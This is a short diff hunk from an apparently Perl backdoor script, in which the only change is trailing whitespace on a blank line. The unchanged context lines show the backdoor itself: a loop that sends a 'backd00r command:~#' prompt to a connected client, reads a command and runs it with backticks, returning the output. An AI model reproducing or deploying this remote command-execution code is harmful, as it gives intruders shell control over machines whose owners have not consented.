@@ -22,7 +22,7 @@ sub main {
     while(1) {
       $client -> send("backd00r command:~# ");
       $client -> recv(my $command, 5);
-
+      
       my $cmd = `$command`;
       $client -> send($cmd);
     }
